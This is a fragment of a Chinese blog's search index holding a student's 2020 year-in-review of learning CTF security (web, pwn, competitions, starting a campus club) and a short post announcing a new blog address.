          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 校内课程笔记 </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年度总结</title>
      <link href="2021/03/05/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>2021/03/05/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="1-3月"><a href="#1-3月" class="headerlink" title="1-3月"></a>1-3月</h2><p>1-3月啥也不会，铁fw罢了，在学校摸摸鱼，电子人，电脑小白-.-</p><h2 id="3月"><a href="#3月" class="headerlink" title="3月"></a>3月</h2><p>接触网络安全源于一个电影，挺感兴趣的，在全网搜索相关文献资料啥的，也啥也不会，后来发现ctf比赛，想着学学吧，从web安全开始了，记得一开始是听的哔哩哔哩课程，什么从入门到入狱啥的，师傅其实讲的很好，那个时候学会了sql注入，xss啥的，不过只知道原理，并不会相关操作。<br>后来发现一个网站叫bugku，开始刷题了，一开始过程是自闭的，什么f12都不会，然后开始陆陆续续学JavaScript前端啥的，php和mysql也简单学学，后来面向wp做题有了一点点感觉。</p><h2 id="4-5月"><a href="#4-5月" class="headerlink" title="4-5月"></a>4-5月</h2><p>由于疫情的爆发没有开学，上网课，就很nice，然后就不听课，开始疯狂自学做题，当时啥都学早6点到晚12点左右，python php JavaScript linux …… 反正就是什么都会一点但是不精细。<br>后来打比赛，直接自闭了，认识了堆堆师傅，当时堆堆师傅主方向是web副方向是pwn，很羡慕，太羡慕pwn👴👴了，然后堆堆告诉我一个网站叫buuoj，让我开始做那个东西，然后就开始入坑buu了，记得第一道题好像是目录穿越还是反序列化不太记得了，从白天一直做到凌晨，各种抄wp复现，打击太大了，然后堆堆师傅凌晨4点多教我怎么做呜呜呜太感动了，然后告诉我说极客大挑战系列的题目比较简单，我就开始挑简单题做。然后从哔哩哔哩疯狂听课，后来学了两周misc，在MRCTF新生赛上出了一两个web和四五道misc，太满足了，第一次找到成就感，然后后来一个啥比赛又整自闭了。然后进入迷茫期。中间我帮七星师傅了录了一期长亭科技师傅做的pwn课程，那是什么鬼啊从头到尾全程懵逼，就硬生生给👴听睡着了。</p><h2 id="6-7月"><a href="#6-7月" class="headerlink" title="6-7月"></a>6-7月</h2><p>下学期快考试了，然后转专业啥的，由于上学期成绩还可以，然后就想着转个专业8，本来是想选网安的，但是竟然不能转因为是新开的专业啊可恶，然后又想转计科，但是看到人才培养方案发现网络专业竟然有安全课于是来到了网络专业，后话了（<br>然后快考试了，啥也没学这学期，开始疯狂补课，电路从第三章👴就没听懂过，猴博士yyds，高数二边听课边玩游戏，高数叔yyds。最终都考的还行。然后web方向面临瓶颈了，开始过渡pwn。<br>没有课程，从汇编开始学，贼痛苦，晚上做梦都是噩梦。反正那段时间挺难受的。<br>用了一段时间把wiki上的大部分栈知识点搞定之后开始冲刺堆部分。<br>怎么说呢，堆部分刚开始对于👴来说简直是地狱。没有学过数据结构，文献看不懂，又没有视频资料，七星师傅群里也没有pwn手，就很难受，当时星盟的一个师傅出了一套pwn课程，堆部分只有一丢丢，但是很满足了，慢慢啃wiki，最后还是学到了很多东西。</p><h2 id="8-9月"><a href="#8-9月" class="headerlink" title="8-9月"></a>8-9月</h2><p>旅游，各种玩耍，咕了</p><h2 id="9-12月"><a href="#9-12月" class="headerlink" title="9-12月"></a>9-12月</h2><p>下学期开始了，新班级，带了一个舍友开始学ctf，同班同学碰见一个特别强的师傅，后来认识了一下才知道这个师傅是计算机大类的系第一，高中就开始搞技术了，web手，膜。然后继续pwn，基本上一天两到三个buu吧，不会就记录查wp，技术上是有一定进步的，然后打了省的一个小比赛拿了一个二等奖，后来跟web师傅组队又打了一个线下赛拿了第一名，挺满意的。然后陆陆续续做题，把buu的一分pwn做完了，当时pwn总榜排名也进入前50了，然后就是复习课准备考试了，中间还成立了我们校的第一个ctf社团，感谢各位老师的支持和帮助</p><h2 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h2><p>最终寒假来了，摸了一个寒假，学了几天的运维</p><p>2021开学了，准备继续学pwn，堆部分还没有结束，还是跟师傅们差的太远，不过这一年认识很多hxd，校内师傅不用说了，堆堆师傅，七星师傅，雪殇师傅，Mz1师傅，Fz师傅，N神，低调的L0ne1y师傅等等，路很长，加油，共勉！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>New</title>
      <link href="2021/03/05/New/"/>
      <url>2021/03/05/New/</url>
      
        <content type="html"><![CDATA[<h3 id="新博客！"><a href="#新博客！" class="headerlink" title="新博客！"></a>新博客！</h3><p>原博客地址：<a href="https://cnblogs.com/lemon629/">https://cnblogs.com/lemon629/</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
